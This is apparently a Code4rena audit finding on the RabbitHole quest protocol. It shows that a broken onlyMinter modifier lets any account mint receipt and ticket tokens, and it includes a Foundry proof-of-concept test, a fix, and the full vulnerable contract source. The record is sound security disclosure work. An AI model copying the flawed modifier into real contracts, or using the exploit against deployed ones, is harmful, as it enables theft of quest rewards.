{
  "Title": "[H-01] Bad implementation in minter access control for RabbitHoleReceipt and RabbitHoleTickets contracts",
  "Content": "# Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50\n\n\n# Vulnerability details\n\nBoth `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:\n\nRabbitHoleReceipt:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104\n\n```solidity\nfunction mint(address to_, string memory questId_) public onlyMinter {\n    _tokenIds.increment();\n    uint newTokenID = _tokenIds.current();\n    questIdForTokenId[newTokenID] = questId_;\n    timestampForTokenId[newTokenID] = block.timestamp;\n    _safeMint(to_, newTokenID);\n}\n```\n\nRabbitHoleTickets:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85\n\n```solidity\nfunction mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {\n    _mint(to_, id_, amount_, data_);\n}\n```\n\nHowever, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:\n\n```solidity\nmodifier onlyMinter() {\n    msg.sender == minterAddress;\n    _;\n}\n```\n\n## Impact\n\nAny account can mint any number of `RabbitHoleReceipt` and `RabbitHoleTickets` tokens.\n\nThis represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.\n\n## PoC\n\nThe following test demonstrates the issue.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n    \n    function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {\n        address attacker = makeAddr(\"attacker\");\n\n        vm.startPrank(attacker);\n\n        // Anyone can freely mint RabbitHoleReceipt\n        string memory questId = \"a quest\";\n        receipt.mint(attacker, questId);\n        assertEq(receipt.balanceOf(attacker), 1);\n\n        // Anyone can freely mint RabbitHoleTickets\n        uint256 tokenId = 0;\n        tickets.mint(attacker, tokenId, 1, \"\");\n        assertEq(tickets.balanceOf(attacker, tokenId), 1);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## Recommendation\n\nThe modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn't hold.\n\n```solidity\nmodifier onlyMinter() {\n    require(msg.sender == minterAddress);\n    _;\n}\n```\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2023-01-rabbithole-quest-protocol-contest",
  "Code": [
    {
      "filename": "contracts/RabbitHoleReceipt.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport '@openzeppelin/contracts-upgradeable/token/ERC721/ERC721Upgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721URIStorageUpgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721EnumerableUpgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol';\nimport '@openzeppelin/contracts-upgradeable/interfaces/IERC2981Upgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/utils/CountersUpgradeable.sol';\nimport './ReceiptRenderer.sol';\nimport './interfaces/IQuestFactory.sol';\nimport './interfaces/IQuest.sol';\n\ncontract RabbitHoleReceipt is\n    Initializable,\n    ERC721Upgradeable,\n    ERC721EnumerableUpgradeable,\n    ERC721URIStorageUpgradeable,\n    OwnableUpgradeable,\n    IERC2981Upgradeable\n{\n    event RoyaltyFeeSet(uint256 indexed royaltyFee);\n    event MinterAddressSet(address indexed minterAddress);\n\n    using CountersUpgradeable for CountersUpgradeable.Counter;\n    CountersUpgradeable.Counter private _tokenIds;\n\n    // storage\n    mapping(uint => string) public questIdForTokenId;\n    address public royaltyRecipient;\n    address public minterAddress;\n    uint public royaltyFee;\n    mapping(uint => uint) public timestampForTokenId;\n    ReceiptRenderer public ReceiptRendererContract;\n    IQuestFactory public QuestFactoryContract;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(\n        address receiptRenderer_,\n        address royaltyRecipient_,\n        address minterAddress_,\n        uint royaltyFee_\n    ) public initializer {\n        __ERC721_init('RabbitHoleReceipt', 'RHR');\n        __ERC721URIStorage_init();\n        __Ownable_init();\n        royaltyRecipient = royaltyRecipient_;\n        minterAddress = minterAddress_;\n        royaltyFee = royaltyFee_;\n        ReceiptRendererContract = ReceiptRenderer(receiptRenderer_);\n    }\n\n    modifier onlyMinter() {\n        msg.sender == minterAddress;\n        _;\n    }\n\n    /// @dev set the receipt renderer contract\n    /// @param receiptRenderer_ the address of the receipt renderer contract\n    function setReceiptRenderer(address receiptRenderer_) public onlyOwner {\n        ReceiptRendererContract = ReceiptRenderer(receiptRenderer_);\n    }\n\n    /// @dev set the royalty recipient\n    /// @param royaltyRecipient_ the address of the royalty recipient\n    function setRoyaltyRecipient(address royaltyRecipient_) public onlyOwner {\n        royaltyRecipient = royaltyRecipient_;\n    }\n\n    /// @dev set the quest factory contract\n    /// @param questFactory_ the address of the quest factory contract\n    function setQuestFactory(address questFactory_) public onlyOwner {\n        QuestFactoryContract = IQuestFactory(questFactory_);\n    }\n\n    /// @dev set the minter address\n    /// @param minterAddress_ the address of the minter\n    function setMinterAddress(address minterAddress_) public onlyOwner {\n        minterAddress = minterAddress_;\n        emit MinterAddressSet(minterAddress_);\n    }\n\n    /// @dev set the royalty fee\n    /// @param royaltyFee_ the royalty fee\n    function setRoyaltyFee(uint256 royaltyFee_) public onlyOwner {\n        royaltyFee = royaltyFee_;\n        emit RoyaltyFeeSet(royaltyFee_);\n    }\n\n    /// @dev mint a receipt\n    /// @param to_ the address to mint to\n    /// @param questId_ the quest id\n    function mint(address to_, string memory questId_) public onlyMinter {\n        _tokenIds.increment();\n        uint newTokenID = _tokenIds.current();\n        questIdForTokenId[newTokenID] = questId_;\n        timestampForTokenId[newTokenID] = block.timestamp;\n        _safeMint(to_, newTokenID);\n    }\n\n    /// @dev get the token ids for a quest owned by an address\n    /// @param questId_ the quest id\n    /// @param claimingAddress_ the address claiming to own the tokens\n    function getOwnedTokenIdsOfQuest(\n        string memory questId_,\n        address claimingAddress_\n    ) public view returns (uint[] memory) {\n        uint msgSenderBalance = balanceOf(claimingAddress_);\n        uint[] memory tokenIdsForQuest = new uint[](msgSenderBalance);\n        uint foundTokens = 0;\n\n        for (uint i = 0; i < msgSenderBalance; i++) {\n            uint tokenId = tokenOfOwnerByIndex(claimingAddress_, i);\n            if (keccak256(bytes(questIdForTokenId[tokenId])) == keccak256(bytes(questId_))) {\n                tokenIdsForQuest[i] = tokenId;\n                foundTokens++;\n            }\n        }\n\n        uint[] memory filteredTokens = new uint[](foundTokens);\n        uint filterTokensIndexTracker = 0;\n\n        for (uint i = 0; i < msgSenderBalance; i++) {\n            if (tokenIdsForQuest[i] > 0) {\n                filteredTokens[filterTokensIndexTracker] = tokenIdsForQuest[i];\n                filterTokensIndexTracker++;\n            }\n        }\n        return filteredTokens;\n    }\n\n    /// @dev burn a receipt\n    /// @param tokenId_ the token id\n    function _burn(uint256 tokenId_) internal override(ERC721Upgradeable, ERC721URIStorageUpgradeable) {\n        super._burn(tokenId_);\n    }\n\n    /// @dev before token transfer hook, called before any token transfer\n    /// @param from_ the address from\n    /// @param to_ the address to\n    /// @param tokenId_ the token id\n    /// @param batchSize_ the batch size\n    function _beforeTokenTransfer(\n        address from_,\n        address to_,\n        uint256 tokenId_,\n        uint256 batchSize_\n    ) internal override(ERC721Upgradeable, ERC721EnumerableUpgradeable) {\n        super._beforeTokenTransfer(from_, to_, tokenId_, batchSize_);\n    }\n\n    /// @dev return the token uri, this delegates to the receipt renderer contract\n    function tokenURI(\n        uint tokenId_\n    ) public view virtual override(ERC721Upgradeable, ERC721URIStorageUpgradeable) returns (string memory) {\n        require(_exists(tokenId_), 'ERC721URIStorage: URI query for nonexistent token');\n        require(QuestFactoryContract != IQuestFactory(address(0)), 'QuestFactory not set');\n\n        string memory questId = questIdForTokenId[tokenId_];\n        (address questAddress, uint totalParticipants, ) = QuestFactoryContract.questInfo(questId);\n        IQuest questContract = IQuest(questAddress);\n\n        bool claimed = questContract.isClaimed(tokenId_);\n        uint rewardAmount = questContract.getRewardAmount();\n        address rewardAddress = questContract.getRewardToken();\n\n        return ReceiptRendererContract.generateTokenURI(tokenId_, questId, totalParticipants, claimed, rewardAmount, rewardAddress);\n    }\n\n    /// @dev See {IERC165-royaltyInfo}\n    /// @param tokenId_ the token id\n    /// @param salePrice_ the sale price\n    function royaltyInfo(\n        uint256 tokenId_,\n        uint256 salePrice_\n    ) external view override returns (address receiver, uint256 royaltyAmount) {\n        require(_exists(tokenId_), 'Nonexistent token');\n\n        uint256 royaltyPayment = (salePrice_ * royaltyFee) / 10_000;\n        return (royaltyRecipient, royaltyPayment);\n    }\n\n    /// @dev returns true if the supplied interface id is supported\n    /// @param interfaceId_ the interface id\n    function supportsInterface(\n        bytes4 interfaceId_\n    ) public view virtual override(ERC721Upgradeable, ERC721EnumerableUpgradeable, IERC165Upgradeable) returns (bool) {\n        return interfaceId_ == type(IERC2981Upgradeable).interfaceId || super.supportsInterface(interfaceId_);\n    }\n}"
    },
    {
      "filename": "contracts/RabbitHoleTickets.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport '@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/token/ERC1155/extensions/ERC1155BurnableUpgradeable.sol';\nimport '@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol';\nimport '@openzeppelin/contracts-upgradeable/interfaces/IERC2981Upgradeable.sol';\nimport './TicketRenderer.sol';\n\ncontract RabbitHoleTickets is\n    Initializable,\n    ERC1155Upgradeable,\n    OwnableUpgradeable,\n    ERC1155BurnableUpgradeable,\n    IERC2981Upgradeable\n{\n    event RoyaltyFeeSet(uint256 indexed royaltyFee);\n    event MinterAddressSet(address indexed minterAddress);\n\n    // storage\n    address public royaltyRecipient;\n    address public minterAddress;\n    uint public royaltyFee;\n    TicketRenderer public TicketRendererContract;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(\n        address ticketRenderer_,\n        address royaltyRecipient_,\n        address minterAddress_,\n        uint royaltyFee_\n    ) public initializer {\n        __ERC1155_init('');\n        __Ownable_init();\n        __ERC1155Burnable_init();\n        royaltyRecipient = royaltyRecipient_;\n        minterAddress = minterAddress_;\n        royaltyFee = royaltyFee_;\n        TicketRendererContract = TicketRenderer(ticketRenderer_);\n    }\n\n    modifier onlyMinter() {\n        msg.sender == minterAddress;\n        _;\n    }\n\n    /// @dev set the ticket renderer contract\n    /// @param ticketRenderer_ the address of the ticket renderer contract\n    function setTicketRenderer(address ticketRenderer_) public onlyOwner {\n        TicketRendererContract = TicketRenderer(ticketRenderer_);\n    }\n\n    /// @dev set the royalty recipient\n    /// @param royaltyRecipient_ the address of the royalty recipient\n    function setRoyaltyRecipient(address royaltyRecipient_) public onlyOwner {\n        royaltyRecipient = royaltyRecipient_;\n    }\n\n    /// @dev set the royalty fee\n    /// @param royaltyFee_ the royalty fee\n    function setRoyaltyFee(uint256 royaltyFee_) public onlyOwner {\n        royaltyFee = royaltyFee_;\n        emit RoyaltyFeeSet(royaltyFee_);\n    }\n\n    /// @dev set the minter address\n    /// @param minterAddress_ the address of the minter\n    function setMinterAddress(address minterAddress_) public onlyOwner {\n        minterAddress = minterAddress_;\n        emit MinterAddressSet(minterAddress_);\n    }\n\n    /// @dev mint a single ticket, only callable by the allowed minter\n    /// @param to_ the address to mint the ticket to\n    /// @param id_ the id of the ticket to mint\n    /// @param amount_ the amount of the ticket to mint\n    /// @param data_ the data to pass to the mint function\n    function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {\n        _mint(to_, id_, amount_, data_);\n    }\n\n    /// @dev mint a batch of tickets, only callable by the allowed minter\n    /// @param to_ the address to mint the tickets to\n    /// @param ids_ the ids of the tickets to mint\n    /// @param amounts_ the amounts of the tickets to mint\n    /// @param data_ the data to pass to the mint function\n    function mintBatch(\n        address to_,\n        uint256[] memory ids_,\n        uint256[] memory amounts_,\n        bytes memory data_\n    ) public onlyMinter {\n        _mintBatch(to_, ids_, amounts_, data_);\n    }\n\n    /// @dev return the uri, this delegates to the ticket renderer contract\n    function uri(uint tokenId_) public view virtual override(ERC1155Upgradeable) returns (string memory) {\n        return TicketRendererContract.generateTokenURI(tokenId_);\n    }\n\n    /// @dev See {IERC165-royaltyInfo}\n    /// @param tokenId_ the token id\n    /// @param salePrice_ the sale price\n    function royaltyInfo(\n        uint256 tokenId_,\n        uint256 salePrice_\n    ) external view override returns (address receiver, uint256 royaltyAmount) {\n        uint256 royaltyPayment = (salePrice_ * royaltyFee) / 10_000;\n        return (royaltyRecipient, royaltyPayment);\n    }\n\n    /// @dev returns true if the supplied interface id is supported\n    /// @param interfaceId_ the interface id\n    function supportsInterface(\n        bytes4 interfaceId_\n    ) public view virtual override(ERC1155Upgradeable, IERC165Upgradeable) returns (bool) {\n        return interfaceId_ == type(IERC2981Upgradeable).interfaceId || super.supportsInterface(interfaceId_);\n    }\n}"
    }
  ]
}